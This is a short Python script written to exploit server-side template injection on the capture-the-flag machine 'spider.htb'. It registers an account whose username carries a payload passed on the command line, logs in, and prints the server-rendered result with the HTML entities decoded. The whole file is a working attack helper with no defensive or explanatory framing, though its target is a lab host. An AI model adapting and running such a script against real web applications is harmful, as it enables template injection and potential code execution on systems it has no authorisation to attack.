#!/usr/bin/env python3

import re
import requests
import sys


def main():
    username = sys.argv[1]  # Inject SSTI payload here

    if len(username) > 10:
        print('Username cannot be longer than 10 characters')
        sys.exit()

    password = 'asdf'

    data = {
        'username': username,
        'confirm_username': username,
        'password': password,
        'confirm_password': password
    }

    s = requests.session()
    r = s.post('http://spider.htb/register', data=data)

    try:
        uuid = re.search(
            r'<input type="text" name="username" value="(.*?)" />', r.text).group(1)
    except AttributeError:
        print(r.text)
        sys.exit()

    uuid = re.search(
        r'<input type="text" name="username" value="(.*?)" />', r.text).group(1)

    s.post('http://spider.htb/login',
           data={'username': uuid, 'password': password})
    r = s.get('http://spider.htb/user')

    try:
        result = re.search(
            r'<input type="text" name="username" readonly value="(.*?)" />', r.text).group(1)
        result = result.replace('&#39;', "'").replace(
            '&lt;', '<').replace('&gt;', '>')
        print(result)
    except AttributeError:
        print(r.text)


if __name__ == '__main__':
    main()
